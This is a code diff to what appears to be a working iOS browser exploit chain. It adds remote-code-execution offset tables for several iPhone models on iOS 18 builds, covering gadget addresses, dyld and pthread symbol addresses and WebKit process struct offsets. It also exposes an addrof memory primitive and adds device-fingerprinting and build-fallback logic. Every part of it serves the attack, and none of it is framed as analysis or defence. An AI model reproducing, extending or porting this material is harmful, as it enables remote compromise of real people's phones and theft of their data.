@@ -1275,6 +1275,113 @@ rce_offsets = {
       rxMtlBuffer_off: 0x70n,
       vertexAttribVector_off: 0x2548n
    },
+   "iPhone14,5_22F75": {
+      AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken: 0x1edadf2d8n,
+      AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker: 0x1edadedc0n,
+      AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest: 0x1edaded20n,
+      AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice: 0x1edaded70n,
+      AVFAudio__OBJC_CLASS__AVSpeechUtterance: 0x1edade168n,
+      AVFAudio__cfstr_SystemLibraryTextToSpeech: 0x1f195b658n,
+      AXCoreUtilities__DefaultLoader: 0x1eb7bcbe0n,
+      CAPointer: 0x20n,
+      CFNetwork__gConstantCFStringValueTable: 0x1ee9326e0n,
+      CGContextDelegate: 0x28n,
+      CMPhoto__CMPhotoCompressionCreateContainerFromImageExt: 0x1ac3ea428n,
+      CMPhoto__CMPhotoCompressionCreateDataContainerFromImage: 0x1ac3ea580n,
+      CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage: 0x1ac3b9cb8n,
+      CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation: 0x1ac3ba1e4n,
+      CMPhoto__CMPhotoCompressionSessionAddCustomMetadata: 0x1ac3ba748n,
+      CMPhoto__CMPhotoCompressionSessionAddExif: 0x1ac3ba304n,
+      CMPhoto__kCMPhotoTranscodeOption_Strips: 0x1e80ad898n,
+      DesktopServicesPriv_bss: 0x1ecca3a08n,
+      Foundation__NSBundleTables_bundleTables_value: 0x1ed8ebe88n,
+      GPUConnectionToWebProcess_m_remoteGraphicsContextGLMap: 0xf0n,
+      GPUProcess_singleton: 0x1eb924a98n,
+      GetCurrentThreadTLSIndex_CurrentThreadIndex: 0x1ee7f3bc0n,
+      HOMEUI_cstring: 0x182f75636n,
+      IOSurfaceContextDelegate: 0x120n,
+      IOSurfaceDrawable: 0x150n,
+      IOSurfaceQueue: 0x48n,
+      ImageIO__IIOLoadCMPhotoSymbols: 0x18865182cn,
+      ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt: 0x1ed9be7f0n,
+      ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage: 0x1ed9be4a0n,
+      ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage: 0x1ed9be4a8n,
+      ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation: 0x1ed9be4b0n,
+      ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata: 0x1ed9be3f0n,
+      ImageIO__gFunc_CMPhotoCompressionSessionAddExif: 0x1ed9be4b8n,
+      ImageIO__gImageIOLogProc: 0x1ee9bc960n,
+      JavaScriptCore__globalFuncParseFloat: 0x19a8715ecn,
+      JavaScriptCore__jitAllowList: 0x1edb3e4a0n,
+      JavaScriptCore__jitAllowList_once: 0x1edb3e2b8n,
+      MediaAccessibility__MACaptionAppearanceGetDisplayType: 0x1bac39744n,
+      PerfPowerServicesReader_cstring: 0x257ebfe60n,
+      RemoteGraphicsContextGLWorkQueue: 0x1eda5ea58n,
+      RemoteRenderingBackendProxy_off: 0x830n,
+      RemoteRenderingBackendProxy_streamConnection: 0x40n,
+      Security__SecKeychainBackupSyncable_block_invoke: 0x18b5d7688n,
+      Security__SecOTRSessionProcessPacketRemote_block_invoke: 0x18b5eb958n,
+      Security__gSecurityd: 0x1eb67fd78n,
+      TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit: 0x1edd8d288n,
+      UI_m_connection: 0x28n,
+      WebCore__DedicatedWorkerGlobalScope_vtable: 0x1f137cf70n,
+      WebCore__PAL_getPKContactClass: 0x1eda62cb8n,
+      WebCore__TelephoneNumberDetector_phoneNumbersScanner_value: 0x1eb91eed0n,
+      WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts: 0x1eb8d9ac8n,
+      WebCore__initPKContact_once: 0x1eda6b7f8n,
+      WebCore__initPKContact_value: 0x1eda6b800n,
+      WebCore__softLinkDDDFACacheCreateFromFramework: 0x1eda69fc0n,
+      WebCore__softLinkDDDFAScannerFirstResultInUnicharArray: 0x1eda69fb8n,
+      WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType: 0x1eda69fa0n,
+      WebCore__softLinkOTSVGOTSVGTableRelease: 0x1eeb48548n,
+      WebProcess_ensureGPUProcessConnection: 0x199195958n,
+      WebProcess_gpuProcessConnectionClosed: 0x199ae82fcn,
+      WebProcess_singleton: 0x1eda5fc00n,
+      __pthread_head: 0x26973c020n,
+      dyld__RuntimeState_emptySlot: 0x1a9a75b6cn,
+      dyld__RuntimeState_vtable: 0x1f2871aa0n,
+      dyld__dlopen_from_lambda_ret: 0x1a9a33fc8n,
+      dyld__signPointer: 0x1a9a3f3e4n,
+      emptyString: 0x1edb14420n,
+      free_slabs: 0x1ed9a55d0n,
+      gadget_control_1_ios184: 0x23f0ca2ecn,
+      gadget_control_2_ios184: 0x1ad86ac28n,
+      gadget_control_3_ios184: 0x21f271150n,
+      gadget_loop_1_ios184: 0x1865f818cn,
+      gadget_loop_2_ios184: 0x20d245da8n,
+      gadget_loop_3_ios184: 0x184d29f1cn,
+      gadget_set_all_registers_ios184: 0x20dfbe16cn,
+      jsc_base: 0x19a45a000n,
+      libARI_cstring: 0x218acf820n,
+      libGPUCompilerImplLazy__invoker: 0x23ce6f7e8n,
+      libGPUCompilerImplLazy_cstring: 0x23bfb9870n,
+      libdyld__dlopen: 0x1ad86c7b8n,
+      libdyld__dlsym: 0x1ad86da34n,
+      libdyld__gAPIs: 0x1ed5b8000n,
+      libsystem_c__atexit_mutex: 0x1ed8caa98n,
+      libsystem_kernel__thread_suspend: 0x1d3da51c0n,
+      libsystem_pthread_base: 0x20d294000n,
+      WebProcess_pageMap: 0x78n,
+      m_backend: 0x70n,
+      m_drawingArea: 0x50n,
+      m_gpuProcessConnection: 0x158n,
+      GPUProcessConnection_connection: 0x20n,
+      m_gpuProcessConnection_m_identifier: 0x38n,
+      m_imageBuffer: 0x18n,
+      m_isRenderingSuspended: 0xe8n,
+      m_platformContext: 0x38n,
+      m_remoteDisplayLists: 0x70n,
+      m_remoteRenderingBackendMap: 0xe8n,
+      m_webProcessConnections: 0x80n,
+      mach_task_self_ptr: 0x1ed8c9d00n,
+      mainRunLoop: 0x1edb2c020n,
+      privateState_off: 0x7e8n,
+      pthread_create_jsc: 0x19bd26f30n,
+      pthread_create_offset: 0x6988n,
+      runLoopHolder_tid: 0x1edb3c708n,
+      rxBufferMtl_off: 0x100n,
+      rxMtlBuffer_off: 0x70n,
+      vertexAttribVector_off: 0x2548n
+   },
    "iPhone14,6_22F76": {
       AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken: 0x1edadf098n,
       AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker: 0x1edadeb80n,
@@ -3458,6 +3565,110 @@ rce_offsets = {
       rxBufferMtl_off: 0x100n,
       rxMtlBuffer_off: 0x70n,
       vertexAttribVector_off: 0x2548n
+   },
+   "iPhone13,2_3_4_22E240": {
+      AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken: 0x1ee8d9d98n,
+      AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker: 0x1ee8d9880n,
+      AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest: 0x1ee8d97e0n,
+      AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice: 0x1ee8d9830n,
+      AVFAudio__OBJC_CLASS__AVSpeechUtterance: 0x1ee8d8c28n,
+      AVFAudio__cfstr_SystemLibraryTextToSpeech: 0x1f27a9398n,
+      AXCoreUtilities__DefaultLoader: 0x1ec5979b0n,
+      CAPointer: 0x20n,  // [struct_constant]
+      CFNetwork__gConstantCFStringValueTable: 0x1ef769ea0n,
+      CGContextDelegate: 0x28n,  // [struct_constant]
+      CMPhoto__CMPhotoCompressionCreateContainerFromImageExt: 0x1abfd13b4n,
+      CMPhoto__CMPhotoCompressionCreateDataContainerFromImage: 0x1abfd150cn,
+      CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage: 0x1abf4bd1cn,
+      CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation: 0x1abfa154cn,
+      CMPhoto__CMPhotoCompressionSessionAddCustomMetadata: 0x1abfa1ab0n,
+      CMPhoto__CMPhotoCompressionSessionAddExif: 0x1abfa166cn,
+      CMPhoto__kCMPhotoTranscodeOption_Strips: 0x1e8dbe6e8n,
+      DesktopServicesPriv_bss: 0x1eda52fc8n,
+      Foundation__NSBundleTables_bundleTables_value: 0x1ee6e6a98n,
+      GPUConnectionToWebProcess_m_remoteGraphicsContextGLMap: 0xf0n,  // [struct_constant]
+      GPUProcess_singleton: 0x1ec6ffb18n,
+      GetCurrentThreadTLSIndex_CurrentThreadIndex: 0x1ef625b90n,
+      HOMEUI_cstring: 0x182f8b696n,
+      IOSurfaceContextDelegate: 0x120n,  // [struct_constant]
+      IOSurfaceDrawable: 0x150n,  // [struct_constant]
+      IOSurfaceQueue: 0x48n,  // [struct_constant]
+      ImageIO__IIOLoadCMPhotoSymbols: 0x1886ca850n,
+      ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt: 0x1ee7b95f0n,
+      ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage: 0x1ee7b92a0n,
+      ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage: 0x1ee7b92a8n,
+      ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation: 0x1ee7b92b0n,
+      ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata: 0x1ee7b91f0n,
+      ImageIO__gFunc_CMPhotoCompressionSessionAddExif: 0x1ee7b92b8n,
+      ImageIO__gImageIOLogProc: 0x1ef7f4160n,
+      JavaScriptCore__globalFuncParseFloat: 0x19a5e12b0n,
+      JavaScriptCore__jitAllowList: 0x1ee93a4a0n,
+      JavaScriptCore__jitAllowList_once: 0x1ee93a2b8n,
+      MediaAccessibility__MACaptionAppearanceGetDisplayType: 0x1ba7d8ac8n,
+      PerfPowerServicesReader_cstring: 0x2574a7e60n,
+      RemoteGraphicsContextGLWorkQueue: 0x1ee859868n,
+      RemoteRenderingBackendProxy_off: 0x830n,  // [struct_constant]
+      Security__SecKeychainBackupSyncable_block_invoke: 0x18b5dfeb0n,
+      Security__SecOTRSessionProcessPacketRemote_block_invoke: 0x18b5f4180n,
+      Security__gSecurityd: 0x1ec45bbf8n,
+      TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit: 0x1eeb8c4c8n,
+      UI_m_connection: 0x28n,  // [struct_constant]
+      WebCore__DedicatedWorkerGlobalScope_vtable: 0x1f21d0998n,
+      WebCore__PAL_getPKContactClass: 0x1ee85dab8n,
+      WebCore__TelephoneNumberDetector_phoneNumbersScanner_value: 0x1ec6f9bf0n,
+      WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts: 0x1ec6b4818n,
+      WebCore__initPKContact_once: 0x1ee866610n,
+      WebCore__initPKContact_value: 0x1ee866618n,
+      WebCore__softLinkDDDFACacheCreateFromFramework: 0x1ee864db8n,
+      WebCore__softLinkDDDFAScannerFirstResultInUnicharArray: 0x1ee864db0n,
+      WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType: 0x1ee864da0n,
+      WebCore__softLinkOTSVGOTSVGTableRelease: 0x1ef9804e8n,
+      WebProcess_ensureGPUProcessConnection: 0x198f12f90n,
+      WebProcess_gpuProcessConnectionClosed: 0x19985ed04n,
+      WebProcess_singleton: 0x1ee85aa00n,
+      __pthread_head: 0x26906c020n,
+      dyld__RuntimeState_emptySlot: 0x1a966b928n,
+      dyld__RuntimeState_vtable: 0x1f36baf08n,
+      dyld__dlopen_from_lambda_ret: 0x1a964d9c8n,
+      dyld__signPointer: 0x1a963c25cn,
+      emptyString: 0x1ee910420n,
+      free_slabs: 0x1ee7a03d0n,
+      gadget_control_1_ios184: 0x23eae92ecn,
+      gadget_control_2_ios184: 0x1ad44dba8n,
+      gadget_control_3_ios184: 0x21ed89f24n,
+      gadget_loop_1_ios184: 0x1866065a4n,
+      gadget_loop_2_ios184: 0x20d0b6b28n,
+      gadget_loop_3_ios184: 0x184d66d9cn,
+      gadget_set_all_registers_ios184: 0x20db3620cn,
+      jsc_base: 0x19a1ce000n,
+      libARI_cstring: 0x2185fe820n,
+      libGPUCompilerImplLazy__invoker: 0x23c89035cn,
+      libGPUCompilerImplLazy_cstring: 0x23b9da870n,
+      libdyld__dlopen: 0x1ad450658n,
+      libdyld__dlsym: 0x1ad4504d4n,
+      libdyld__gAPIs: 0x1ee3b4000n,
+      libsystem_c__atexit_mutex: 0x1ee6c5698n,
+      libsystem_kernel__thread_suspend: 0x1d37991c0n,
+      libsystem_pthread_base: 0x20d105000n,
+      m_backend: 0x70n,  // [struct_constant]
+      m_drawingArea: 0x50n,  // [struct_constant]
+      m_gpuProcessConnection: 0x158n,  // [struct_constant]
+      m_gpuProcessConnection_m_identifier: 0x38n,  // [struct_constant]
+      m_imageBuffer: 0x18n,  // [struct_constant]
+      m_isRenderingSuspended: 0xe8n,  // [struct_constant]
+      m_platformContext: 0x38n,  // [struct_constant]
+      m_remoteDisplayLists: 0x70n,  // [struct_constant]
+      m_remoteRenderingBackendMap: 0xe8n,  // [struct_constant]
+      m_webProcessConnections: 0x80n,  // [struct_constant]
+      mach_task_self_ptr: 0x1ee6c4900n,
+      mainRunLoop: 0x1ee928020n,
+      privateState_off: 0x7e8n,  // [struct_constant]
+      pthread_create_jsc: 0x19b94b640n,
+      pthread_create_offset: 0x6988n,  // [struct_constant]
+      runLoopHolder_tid: 0x1ee938708n,
+      rxBufferMtl_off: 0x100n,  // [struct_constant]
+      rxMtlBuffer_off: 0x70n,  // [struct_constant]
+      vertexAttribVector_off: 0x2548n,  // [struct_constant]
    },
    "iPhone13,4_22E240": {
       AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken: 0x1edadf1d8n,
@@ -8249,6 +8460,7 @@ class check_attempt {
         this.read32 = read32;
         this.read64 = read64;
         this.write64 = write64;
+        this.addrof = addrof;
         // Disable Worklet GC
         const vm = read64(read64(addrof(globalThis).add(0x10n)).add(0x38n));
 
@@ -8374,6 +8586,7 @@ const linkedit_to_device = {
     [0x27288c000n]: "iPhone14,3_22F76",
     [0x271e5c000n]: "iPhone14,4_22F76",
     [0x271e5c000n]: "iPhone14,5_22F76",
+    [0x271e58000n]: "iPhone14,5_22F75",
     [0x271df8000n]: "iPhone14,6_22F76",
     [0x272264000n]: "iPhone14,7_22F76",
     [0x272264000n]: "iPhone14,8_22F76",
@@ -8482,6 +8695,7 @@ const device_chipset = {
 "iPhone12,8_22E240": "f35b705e8c57ae59e369ebc9145a9dbc",
 "iPhone13,1_22E240": "43ba9900ff2fc7d9d32072540b2cab12",
 "iPhone13,2_3_22E240": "43ba9900ff2fc7d9d32072540b2cab12",
+"iPhone13,2_3_4_22E240": "43ba9900ff2fc7d9d32072540b2cab12",
 "iPhone13,4_22E240": "43ba9900ff2fc7d9d32072540b2cab12",
 "iPhone14,2_22E240": "c90776dbac058ed6957f476e287867f8",
 "iPhone14,3_22E240": "c90776dbac058ed6957f476e287867f8",
@@ -8539,6 +8753,7 @@ const device_chipset = {
 "iPhone14,3_22F76": "c90776dbac058ed6957f476e287867f8",
 "iPhone14,4_22F76": "c90776dbac058ed6957f476e287867f8",
 "iPhone14,5_22F76": "c90776dbac058ed6957f476e287867f8",
+"iPhone14,5_22F75": "c90776dbac058ed6957f476e287867f8",
 "iPhone14,6_22F76": "c90776dbac058ed6957f476e287867f8",
 "iPhone14,7_22F76": "c90776dbac058ed6957f476e287867f8",
 "iPhone14,8_22F76": "c90776dbac058ed6957f476e287867f8",
@@ -8633,16 +8848,36 @@ const device_chipset = {
 "iPhone17,5_22G100": "6149d995753968891870832e3fec9195",
 };
 
-        print(`ios_version: ${ios_version}`);
-        const pthread_create_got = BigInt(parse_adrp_add(jsc_base + pthread_create_auth_stubs_offset[ios_version]));
+        const ios_offset_key = (function normalizeIosOffsetKey(v) {
+            let parts;
+            if (v == null) return '';
+            if (Array.isArray(v)) parts = v;
+            else if (typeof v === 'string') parts = v.split(',').map(function (p) { return parseInt(p, 10); });
+            else if (v.join) parts = v;
+            else return String(v);
+            const maj = parts[0] | 0;
+            const min = parts[1] | 0;
+            const pat = parts[2] | 0;
+            if (maj !== 18) return parts.join(',');
+            if (min === 4) return pat === 1 ? '18,4,1' : '18,4';
+            if (min === 5) return '18,5';
+            if (min === 6) {
+                if (pat >= 2) return '18,6,2';
+                if (pat === 1) return '18,6,1';
+                return '18,6';
+            }
+            return parts.join(',');
+        })(ios_version);
+        print(`ios_version: ${ios_version} key ${ios_offset_key}`);
+        const pthread_create_got = BigInt(parse_adrp_add(jsc_base + pthread_create_auth_stubs_offset[ios_offset_key]));
         print(`pthread_create_got: ${pthread_create_got.hex()}`);
         const pthread_create = read64(pthread_create_got).noPAC();
         print(`pthread_create: ${pthread_create.hex()}`);
-        const libsystem_pthread_base = pthread_create - pthread_create_offset[ios_version];
+        const libsystem_pthread_base = pthread_create - pthread_create_offset[ios_offset_key];
         print(`libsystem_pthread_base: ${libsystem_pthread_base.hex()}`);
         const libsystem_pthread_linkedit = read64(libsystem_pthread_base + 0x600n);
         print(`libsystem_pthread_linkedit: ${libsystem_pthread_linkedit.hex()}`);
-        device_model = linkedit_to_device[ios_version][libsystem_pthread_linkedit];
+        device_model = linkedit_to_device[ios_offset_key][libsystem_pthread_linkedit];
         print("device_model: " + device_model);
         chipset = device_chipset[device_model];
         (function resolveOffsetsTable() {
@@ -8654,6 +8889,7 @@ const device_chipset = {
             const tryKeys = [detected];
             // 18.4 only: 22E252 -> 22E240; never silent fall to 22F76 (18.5)
             if (build === '22E252') tryKeys.push(prefix + '22E240');
+            if (build === '22F75') tryKeys.push(prefix + '22F76');
             for (let ti = 0; ti < tryKeys.length; ti++) {
                 if (rce_offsets[tryKeys[ti]]) {
                     if (tryKeys[ti] !== detected) print('offsets fallback: ' + detected + ' -> ' + tryKeys[ti]);
